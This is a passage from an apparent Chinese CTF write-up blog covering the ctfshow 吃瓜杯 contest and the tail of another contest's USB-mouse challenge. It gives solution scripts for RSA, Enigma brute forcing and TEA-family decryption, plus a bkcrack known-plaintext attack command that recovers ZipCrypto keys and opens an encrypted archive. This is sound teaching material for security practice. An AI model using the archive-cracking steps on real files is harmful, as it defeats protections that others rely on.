class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">a=f.readline().strip()</span><br><span class="line"><span class="keyword">if</span> a:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">8</span>:</span><br><span class="line">out=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">fi.write(out)</span><br><span class="line">fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">fi.close()</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;xy.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">12</span> :</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">x = <span class="built_in">int</span>(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line">y = <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">x -= <span class="number">256</span></span><br><span class="line"><span class="keyword">if</span> y &gt; <span class="number">127</span> :</span><br><span class="line">y -= <span class="number">256</span></span><br><span class="line">posx += x</span><br><span class="line">posy += y</span><br><span class="line">btn_flag = <span class="built_in">int</span>(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing</span></span><br><span class="line">    f.write(<span class="built_in">str</span>(posx))</span><br><span class="line">    f.write(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>(posy))</span><br><span class="line">    f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>最后gnuplot做图：</p><p><code>gnuplot&gt; plot &quot;xy.txt&quot;</code></p><p>得到后半部分数字：<code>130, 63, 111, 94, 51, 134, 119, 146</code></p><p>结合flag格式，推知为变异凯撒移位解密，解出：</p><p><code>[71, 87, 72, 84, 123, 87, 51, 108, 67, 111, 109, 51, 95, 116, 48, 95, 77, 33, 115, 99, 125]</code></p><p>即<code>GWHT&#123;W3lCom3_t0_M!sc&#125;</code>，按群提示换为<code>Sangfor&#123;W3lCom3_t0_M!sc&#125;</code>。</p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;大赛由中共广州市委网络安全和信息化委员会办公室作为指导单位，广州市网络安全产业促进会主办，广东外语外贸大学、深信服科技股份有限公司承办，广州市信息安全测评中心、广州互联网协会协办。&lt;/p&gt;
&lt;p&gt;大赛以“网络安全为人民、网络安全靠人民”为主题，旨在</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow 吃瓜杯</title>
    <link href="https://lazzzaro.github.io/2021/08/16/match-CTFshow-%E5%90%83%E7%93%9C%E6%9D%AF/"/>
    <id>https://lazzzaro.github.io/2021/08/16/match-CTFshow-%E5%90%83%E7%93%9C%E6%9D%AF/</id>
    <published>2021-08-16T11:22:00.000Z</published>
    <updated>2021-08-16T12:32:10.014Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>比赛名称：ctfshow 吃瓜杯<br>题目范围：web pwn re misc crypto<br>题目难度：怎么简单怎么来<br>比赛奖励：ctfshow定制鼠标垫或萌妹手办<br>比赛时间：2021年8月14日(周六) 晚 7点7分<br>比赛时长：48小时<br>比赛地址：<a href="https://ctf.show/challenges">https://ctf.show/challenges</a></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Misc游戏签到"><a href="#Misc游戏签到" class="headerlink" title="Misc游戏签到"></a>Misc游戏签到</h3><blockquote><p>运气与<del>策略</del>运气的游戏。值得注意的是，第一局出现必输的情况是正常的，并且概率较低，这能表明您在七夕这个节日真的非常欧，这边建议去抽卡。<del>所以说本题没有策略，只有运气。</del></p><p>地址： 移步去备用题,flag就在这交</p></blockquote><p>运气游戏，写个循环脚本跑出分段flag。</p><p>​    </p><h3 id="Dinner-of-Cyanogen"><a href="#Dinner-of-Cyanogen" class="headerlink" title="Dinner of Cyanogen"></a>Dinner of Cyanogen</h3><p>给了两个docx，一个未加密，另一个加密。</p><p>在未加密docx得到flag第一段；</p><p>发现其中的 <code>[Content_Types].xml</code> 大小相同，上明文攻击：</p><p><code>rbkcrack.exe -C AnotherLetter.zip -c &quot;[Content_Types].xml&quot; -p &quot;[Content_Types].xml&quot;</code></p><p>得到3-key，再用7z工具解压：</p><p><code>7za x AnotherLetter.zip &#39;-p[3b982977_2706fd64_6d6a5135]&#39; -oout</code></p><p>在 <code>flag.xml</code> 得到flag第二段；</p><p>在 <code>word.xml</code> 分别用0/1代替Wingdings两种字体，转字符串得到flag第三段。</p><p>​    </p><h3 id="xl的本质"><a href="#xl的本质" class="headerlink" title="xl的本质"></a>xl的本质</h3><p>Excel 2007（.xlsx）文件本质是压缩包。</p><p>新建一个excel，插入绘图，保存退出。</p><p>替换其中 xl/drawing 目录下的 drawing.xml 为题目给的xml文件，再打开xlsx文件看到flag图片。</p><p>​    </p><h3 id="吃瓜"><a href="#吃瓜" class="headerlink" title="吃瓜"></a>吃瓜</h3><p>jpg改为zip解压，文件为base64图片，浏览器打开得到二维码，扫码得栅栏密码，枚举栏数（栏数=2）解密得flag。</p><p>​    </p><h3 id="魔王"><a href="#魔王" class="headerlink" title="魔王"></a>魔王</h3><blockquote><p><strong>需要自己包上ctfshow{}</strong></p><p>题目有很多误导，小心点哦</p></blockquote><p>w3x为魔兽争霸地图文件，直接找到地图查看工具 War3 Model Editor，找到flag字符串。</p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="闪电五连鞭·一鞭"><a href="#闪电五连鞭·一鞭" class="headerlink" title="闪电五连鞭·一鞭"></a>闪电五连鞭·一鞭</h3><blockquote><p>朋友们好。</p><p>今天，和大家，探讨一下，怎样打RSA置换闪电鞭。</p><p>要做到三点。</p><p>一：要做到问题真正的放松。但是线性代数基本知识要用好。这里面，该松的松，该紧的紧。松中有紧，紧中有松。这个问题非常复杂，在这里不多说。在问题的描述中有详细的解释；</p><p>二：要练好内功，你才能代码中发力，打出RSA置换劲儿。慢练，这是签到的……快练！下合上开，上合下开！所以，这个RSA置换劲儿啊……这个RSA和置换都在动啊……</p><p>三：要用高维的RSA置换劲儿，才能打出RSA置换闪电鞭。因为这个鞭的劲儿，你看……是不是，你看……都是高维的啊……</p><p>下面我打一个连五鞭啊……打了五鞭：<strong>一鞭</strong>，两鞭，三鞭，四鞭，五鞭。这五鞭要连次打，你看：实战时间，一定要动武，全身松好，用高维的劲，RSA置换劲儿！才能打出flag，打出RSA置换闪电鞭！</p><p>谢谢朋友们。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">8870619487339789349033932217513908953609539651949986489986889710933094577873155191810742828503059670650154455297603719</span></span><br><span class="line">c = <span class="number">6940158573485767169443582872275118843545217792197971962103010557916847970940437712181778807436191892307187137338300231</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(<span class="number">3</span>, euler_phi(n))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="闪电五连鞭·二鞭"><a href="#闪电五连鞭·二鞭" class="headerlink" title="闪电五连鞭·二鞭"></a>闪电五连鞭·二鞭</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">random.seed(<span class="number">0x36D</span>)</span><br><span class="line">n = <span class="number">3950848271664122675439855009329233027357977239695163232943132810210035583520735079984423511153607529820284200137188647</span></span><br><span class="line"></span><br><span class="line">Zn = Zmod(n)</span><br><span class="line">P = PermutationGroupElement(<span class="string">&#x27;(1,14,25,8,23,15)(2,22,17)(3,18,13,33,11,30,26,27,10,6,16,31,28,21,29,36,7,9)(4,35,12,32,20,5,24)(19,34)&#x27;</span>)</span><br><span class="line">P = Matrix(Zn, P.matrix())</span><br><span class="line">A = Matrix(Zn, <span class="number">36</span>, <span class="number">36</span>, <span class="keyword">lambda</span> x, y: random.randint(<span class="number">0</span>, <span class="number">0x36D</span>))</span><br><span class="line">B = A * P * A^-<span class="number">1</span></span><br><span class="line">c = [...]</span><br><span class="line">C = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    C.append(c[i*<span class="number">36</span>:(i+<span class="number">1</span>)*<span class="number">36</span>])</span><br><span class="line">C = Matrix(Zn, C)</span><br><span class="line">B_inv = B^<span class="number">3</span></span><br><span class="line">C_new = C / B_inv</span><br><span class="line">cc = C_new[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(<span class="number">3</span>, euler_phi(n))</span><br><span class="line">m = <span class="built_in">pow</span>(cc, d, n)</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="闪电五连鞭·三鞭"><a href="#闪电五连鞭·三鞭" class="headerlink" title="闪电五连鞭·三鞭"></a>闪电五连鞭·三鞭</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BB = B^3</span></span><br><span class="line"><span class="comment"># BB_inv = BB^(-1)</span></span><br><span class="line"><span class="comment"># CC = C * BB_inv</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">25126409997644048715497037905442671105116158875704245711785280791201683049008805107543997350200944348915833337286069203</span></span><br><span class="line">cc = <span class="number">2440870830361488333405717893137622686904829095539256446436231771058787790530861000815874544642875904753470292396055730</span></span><br><span class="line">cc = (cc * gmpy2.invert(<span class="number">36</span>, n)) % n</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(<span class="number">3</span>, euler_phi(n))</span><br><span class="line">m = <span class="built_in">pow</span>(cc, d, n)</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="闪电五连鞭·四鞭"><a href="#闪电五连鞭·四鞭" class="headerlink" title="闪电五连鞭·四鞭"></a>闪电五连鞭·四鞭</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BB = B^17</span></span><br><span class="line"><span class="comment"># BB_inv = BB^(-1)</span></span><br><span class="line"><span class="comment"># CC = C * BB_inv</span></span><br><span class="line"><span class="comment"># I.trace() = 88</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">8832564044541326030658929702316436880591014904231676570839678873603730471484972295046612326549001678639811100026511993</span></span><br><span class="line">cc = <span class="number">5298954238197992022282643920507107154250709069597164746868432885002292554976622438394424965260846005857405245601483810</span></span><br><span class="line">cc = (cc * gmpy2.invert(<span class="number">88</span>, n)) % n</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(<span class="number">17</span>, euler_phi(n))</span><br><span class="line">m = <span class="built_in">pow</span>(cc, d, n)</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="大鸟转转转"><a href="#大鸟转转转" class="headerlink" title="大鸟转转转"></a>大鸟转转转</h3><blockquote><p>为响应群主“怎么简单怎么来”的号召，特补上一道古典密码。</p><p>明文密文都是大写字母。</p><p>请解出正确的明文后，把明文转换成<strong>小写</strong>，并加上格式所包含的花括号。</p></blockquote><p>Engima密码机。</p><p>python反序列化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">x = pickle.load(<span class="built_in">open</span>(<span class="string">&#x27;nimage.pickle&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;&#x27;UMKEHRWALZE&#x27;: &#x27;B&#x27;, &#x27;WALZENLAGE&#x27;: &#x27;123&#x27;, &#x27;GRUNDSTELLUNG&#x27;: &#x27;WYF&#x27;, &#x27;RINGSTELLUNG&#x27;: &#x27;???&#x27;, &#x27;STECKERVERBINDUNGEN&#x27;: [&#x27;WO&#x27;, &#x27;DE&#x27;, &#x27;JB&#x27;, &#x27;HN&#x27;, &#x27;XI&#x27;], &#x27;KLARTEXT&#x27;: &#x27;CTFSHOW?????????????????????????????&#x27;, &#x27;GEHEIMTEXT&#x27;: &#x27;MXKXBTIOOZHFTGGTTPTRNXJUGASUTVBNSNGS&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>尝试用全脚本解密得到的结果有问题，再用pycipher工具解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pycipher <span class="keyword">import</span> Enigma</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic = string.ascii_uppercase</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> dic:</span><br><span class="line">            eng = Enigma(settings=(<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;F&#x27;</span>),rotors=(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),reflector=<span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">                 ringstellung=(x,y,z),steckers=[(<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;O&#x27;</span>),(<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>),</span><br><span class="line">                 (<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;B&#x27;</span>),(<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;N&#x27;</span>),(<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;I&#x27;</span>)])</span><br><span class="line">            flag = eng.decipher(<span class="string">&#x27;MXKXBTIOOZHFTGGTTPTRNXJUGASUTVBNSNGS&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> flag.startswith(<span class="string">&#x27;CTFSHOW&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>((x,y,z),flag.lower())</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="Tea-tube-pot"><a href="#Tea-tube-pot" class="headerlink" title="Tea_tube_pot"></a>Tea_tube_pot</h3><blockquote><p>三点几嚟，饮茶先啦！（给大佬递茶.jpg）</p></blockquote><p>flag分三部分。</p><p>第一部分 TEA加密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0x9E3779B9</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encrypted = [<span class="number">0x5FD744F6</span>,<span class="number">0x95832046</span>]</span><br><span class="line">    key = [<span class="number">0x73696854</span>, <span class="number">0x5F73695F</span>, <span class="number">0x74616574</span>, <span class="number">0x21656275</span>]</span><br><span class="line">    decrypted = decrypt(encrypted, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(decrypted[<span class="number">1</span>])[<span class="number">2</span>:]+<span class="built_in">hex</span>(decrypted[<span class="number">0</span>])[<span class="number">2</span>:])[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ENCrT1ny</span></span><br></pre></td></tr></table></figure><p>第二部分 XTEA加密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">rounds, v, k</span>):</span></span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    x = delta * rounds</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[x &amp; <span class="number">3</span>])</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encrypted = [<span class="number">0xFD731313</span>, <span class="number">0x6662CB90</span>]</span><br><span class="line">    key = [<span class="number">0x73696854</span>, <span class="number">0x5F73695F</span>, <span class="number">0x74616574</span>, <span class="number">0x21656275</span>]</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    decrypted = decrypt(rounds, encrypted, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(decrypted[<span class="number">1</span>])[<span class="number">2</span>:]+<span class="built_in">hex</span>(decrypted[<span class="number">0</span>])[<span class="number">2</span>:])[::-<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line"><span class="comment"># yPti0nA1</span></span><br></pre></td></tr></table></figure><p>第三部分 XXTEA加密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift</span>(<span class="params">z, y, x, k, p, e</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((x ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    x = (rounds * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        p -= <span class="number">1</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        x = (x - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encrypted = [<span class="number">0x4B136C82</span>, <span class="number">0x1A6E9613</span>]</span><br><span class="line">    key = [<span class="number">0x73696854</span>, <span class="number">0x5F73695F</span>, <span class="number">0x74616574</span>, <span class="number">0x21656275</span>]</span><br><span class="line">    decrypted = decrypt(encrypted, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(decrypted[<span class="number">1</span>])[<span class="number">2</span>:]+<span class="built_in">hex</span>(decrypted[<span class="number">0</span>])[<span class="number">2</span>:])[::-<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 9ori7hM!</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="wuqian"><a href="#wuqian" class="headerlink" title="wuqian"></a>wuqian</h3><p>ROP x64签到。然后签退。</p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="热身"><a href="#热身" class="headerlink" title="热身"></a>热身</h3><blockquote><p>最简单的签到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span 